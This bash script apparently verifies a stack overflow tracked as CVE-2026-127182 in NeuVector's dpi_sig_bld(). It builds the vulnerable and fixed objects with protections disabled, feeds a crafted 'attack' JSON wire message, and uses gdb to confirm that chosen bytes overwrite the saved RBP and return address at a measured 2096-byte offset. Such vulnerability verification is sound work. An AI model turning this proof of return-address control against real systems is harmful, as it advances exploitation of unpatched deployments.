#!/usr/bin/env bash
# Plain-frame readback for CVE-2026-127182 using the EXACT REST-valid wire
# message generated by wirepath/run.sh. Links the byte-identical pinned
# vulnerable dpi_sig_bld() object (no ASan, no stack protector) with the
# verbatim pinned dp/ctrl.c JSON consumer, then reads the live frame with gdb.
# Measures chosen wire bytes against the saved RBP and return slot.
set -u
cd "$(dirname "$0")"
pass=0; fail=0
ok()  { echo "PASS $1"; pass=$((pass+1)); }
bad() { echo "FAIL $1"; fail=$((fail+1)); }
has() { grep -q -- "$2" "$1" 2>/dev/null; }

ROOT=$(readlink -f ../src/real/neuvector-48ae8b5cac5ec3a7e332e5272e9b3050f44396cb)
OUT=$(pwd)/out
[ -f "$ROOT/dp/dpi/sig/dpi_sig.c" ] || { echo "FAIL pinned tree missing (run realcaller/run.sh)"; echo "TOTAL: 0 PASS / 1 FAIL"; exit 1; }
[ -f "$OUT/wire-attack.json" ] || { echo "FAIL wire message missing (run run.sh)"; echo "TOTAL: 0 PASS / 1 FAIL"; exit 1; }
[ -f ../realcaller/out/real-vuln-plain.o ] || { echo "FAIL plain real object missing (run realcaller/run.sh)"; echo "TOTAL: 0 PASS / 1 FAIL"; exit 1; }

echo "== provenance =="
sha256sum "$OUT/wire-attack.json" ../realcaller/out/real-vuln-plain.o gen/wirecall.c
printf 'REAL_SRC='; sha256sum "$ROOT/dp/dpi/sig/dpi_sig.c" | cut -d' ' -f1
has "$OUT/wiregen-attack.log" 'pre_total=1024' && has "$OUT/wiregen-attack.log" 'name_len=256' && \
    ok "wire message is the REST-valid W274 attack shape" || bad "wire message is the REST-valid W274 attack shape"

echo "== plain binary with real jansson and real vulnerable object =="
ROOT_INC="-I$(dirname "$ROOT")/shim -I$ROOT -I$ROOT/dp -include stdio.h -include $ROOT/base.h -include $ROOT/defs.h"
PLAIN="-g -O0 -fno-stack-protector -fno-omit-frame-pointer"
gcc $PLAIN -Igen -Ijansson $ROOT_INC -c gen/wirecall.c -o "$OUT/frame-wirecall.o" && ok "verbatim dp consumer compiles plain" || { bad "verbatim dp consumer compiles plain"; echo "TOTAL: $pass PASS / $((fail+1)) FAIL"; exit 1; }
LIB=/usr/lib/x86_64-linux-gnu/libjansson.so.4
gcc $PLAIN -o "$OUT/wire-plain" "$OUT/frame-wirecall.o" ../realcaller/out/real-vuln-plain.o "$LIB" && ok "link wire-plain" || { bad "link wire-plain"; echo "TOTAL: $pass PASS / $((fail+1)) FAIL"; exit 1; }

"$OUT/wire-plain" "$OUT/wire-safe.json" > "$OUT/frame-safe.log" 2>&1 || true
has "$OUT/frame-safe.log" 'WIRECALL rc=0' && ok "plain safe wire message completes" || bad "plain safe wire message completes"
"$OUT/wire-plain" "$OUT/wire-attack.json" > "$OUT/frame-attack.log" 2>&1 || true
echo "plain attack stdout: $(cat "$OUT/frame-attack.log")"

echo "== live frame readback (break at final sprintf, inspect at fault) =="
gdb -q -batch \
    -ex 'set pagination off' \
    -ex 'break dp/dpi/sig/dpi_sig.c:662' \
    -ex "run $OUT/wire-attack.json" \
    -ex 'printf "FRAME BUF=%p RBP=%p DELTA=%ld LEN=%d\n", &dlpsig_buf[0], $rbp, (long)($rbp - &dlpsig_buf[0]), len' \
    -ex 'printf "TAIL_START\n"' \
    -ex 'x/24xb &dlpsig_buf[2040]' \
    -ex 'printf "TAIL_END\n"' \
    -ex 'printf "SAVED slot0=%p slot1=%p\n", *(void **)$rbp, *(void **)((char *)$rbp + 8)' \
    -ex 'x/3gx $rbp' \
    -ex 'x/3gx $rbp+8' \
    -ex 'bt 3' \
    --args "$OUT/wire-plain" "$OUT/wire-attack.json" > "$OUT/frame-gdb-attack.log" 2>&1 || true
grep -qE 'SAVED slot0=0x[0-9a-f]{8,} slot1=0x[0-9a-f]{8,}' "$OUT/frame-gdb-attack.log" && \
    ! grep -qE 'SAVED slot[01]=0x(2a|61|2e)' "$OUT/frame-gdb-attack.log" && \
    ok "saved RBP and return slot remain pointer-shaped at fault" || bad "saved RBP and return slot remain pointer-shaped at fault"

has "$OUT/frame-gdb-attack.log" 'FRAME BUF=' && ok "frame layout captured for wire attack" || bad "frame layout captured for wire attack"
grep -qE 'FRAME BUF=[^ ]+ RBP=[^ ]+ DELTA=[0-9]+' "$OUT/frame-gdb-attack.log" && ok "BUF-to-RBP delta measured" || bad "BUF-to-RBP delta measured"
# Chosen wire pattern bytes are ASCII 'a' (0x61), '.' (0x2e), '*' (0x2a).
TAIL=$(awk '/TAIL_START/{f=1;next}/TAIL_END/{f=0}f' "$OUT/frame-gdb-attack.log")
[ "$(printf '%s' "$TAIL" | grep -oE '0x(61|2e|2a)' | wc -l)" -ge 8 ] && \
    ok "chosen wire pattern bytes past the 2048-byte buffer" || bad "chosen wire pattern bytes past the 2048-byte buffer"

echo "== safe frame control =="
gdb -q -batch \
    -ex 'set pagination off' \
    -ex 'break dp/dpi/sig/dpi_sig.c:662' \
    -ex "run $OUT/wire-safe.json" \
    -ex 'printf "SAFE FRAME BUF=%p RBP=%p LEN=%d\n", &dlpsig_buf[0], $rbp, len' \
    -ex 'x/3gx $rbp' \
    --args "$OUT/wire-plain" "$OUT/wire-safe.json" > "$OUT/frame-gdb-safe.log" 2>&1 || true
has "$OUT/frame-gdb-safe.log" 'Breakpoint 1' && ok "safe wire message reaches final sprintf without fault" || bad "safe wire message reaches final sprintf without fault"
has "$OUT/frame-gdb-safe.log" 'SAFE FRAME BUF=' && ok "safe frame layout captured" || bad "safe frame layout captured"

echo "== optimized real-object frame (-O2, no fortify / no stack protector) =="
O2FLAGS="-g -O2 -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=0 -fno-stack-protector -fno-omit-frame-pointer"
FIXED=$(readlink -f ../src/dpi_sig-fixed.c)
(cd "$ROOT" && gcc $O2FLAGS $ROOT_INC -c dp/dpi/sig/dpi_sig.c -o "$OUT/real-vuln-o2.o") && \
    (cd "$ROOT" && gcc $O2FLAGS $ROOT_INC -x c -c "$FIXED" -o "$OUT/real-fixed-o2.o") && \
    gcc $O2FLAGS -Igen -Ijansson $ROOT_INC -c gen/wirecall.c -o "$OUT/frame-wirecall-o2.o" && \
    gcc $O2FLAGS -o "$OUT/wire-o2-vuln" "$OUT/frame-wirecall-o2.o" "$OUT/real-vuln-o2.o" "$LIB" && \
    gcc $O2FLAGS -o "$OUT/wire-o2-fixed" "$OUT/frame-wirecall-o2.o" "$OUT/real-fixed-o2.o" "$LIB" && \
    ok "optimized real vulnerable/fixed objects build" || { bad "optimized real vulnerable/fixed objects build"; echo "TOTAL: $pass PASS / $((fail+1)) FAIL"; exit 1; }
"$OUT/wire-o2-vuln" "$OUT/wire-safe.json" > "$OUT/o2-safe.log" 2>&1 || true
has "$OUT/o2-safe.log" 'WIRECALL rc=0' && ok "optimized vulnerable object: safe message rc=0" || bad "optimized vulnerable object: safe message rc=0"
"$OUT/wire-o2-fixed" "$OUT/wire-attack.json" > "$OUT/o2-fixed.log" 2>&1 || true
has "$OUT/o2-fixed.log" 'WIRECALL rc=0' && ok "optimized fixed object: attack message rc=0" || bad "optimized fixed object: attack message rc=0"
for mode in a B; do
    case "$mode" in
        a) MSG="$OUT/wire-attack.json"; LOG="$OUT/frame-o2-a.log" ;;
        B) MSG="$OUT/wire-B.json";     LOG="$OUT/frame-o2-B.log" ;;
    esac
    gdb -q -batch \
        -ex 'set pagination off' \
        -ex 'break dp/dpi/sig/dpi_sig.c:662' \
        -ex "run $MSG" \
        -ex 'printf "O2 FRAME BUF=%p RBP=%p DELTA=%ld\n", &dlpsig_buf[0], $rbp, (long)($rbp - &dlpsig_buf[0])' \
        -ex 'x/24xb &dlpsig_buf[2040]' \
        -ex 'printf "SAVED slot0=%p slot1=%p\n", *(void **)$rbp, *(void **)((char *)$rbp + 8)' \
        --args "$OUT/wire-o2-vuln" "$MSG" > "$LOG" 2>&1 || true
    grep -E 'O2 FRAME|SAVED|Program received|dpi_sig_bld dp' "$LOG" | head -6
    sed -n '/^0x.*:/p' "$LOG" | head -3
done
grep -qE 'O2 FRAME BUF=[^ ]+ RBP=[^ ]+ DELTA=2096' "$OUT/frame-o2-a.log" && \
    ok "optimized frame measured: BUF-to-RBP delta 2096" || bad "optimized frame measured: BUF-to-RBP delta 2096"
grep -qE 'SAVED slot0=0x[0-9a-f]*61[0-9a-f]* slot1=0x[0-9a-f]*61[0-9a-f]*' "$OUT/frame-o2-a.log" && \
    ok "chosen 'a' pattern bytes fill saved RBP and return slot" || bad "chosen 'a' pattern bytes fill saved RBP and return slot"
grep -qE 'SAVED slot0=0x[0-9a-f]*42[0-9a-f]* slot1=0x[0-9a-f]*42[0-9a-f]*' "$OUT/frame-o2-B.log" && \
    ok "chosen 'B' pattern bytes replace saved RBP and return slot" || bad "chosen 'B' pattern bytes replace saved RBP and return slot"
! cmp -s <(grep '^SAVED ' "$OUT/frame-o2-a.log") <(grep '^SAVED ' "$OUT/frame-o2-B.log") && \
    ok "wire input controls saved frame bytes at chosen offsets" || bad "wire input controls saved frame bytes at chosen offsets"

echo "TOTAL: $pass PASS / $fail FAIL"
[ "$fail" -eq 0 ]
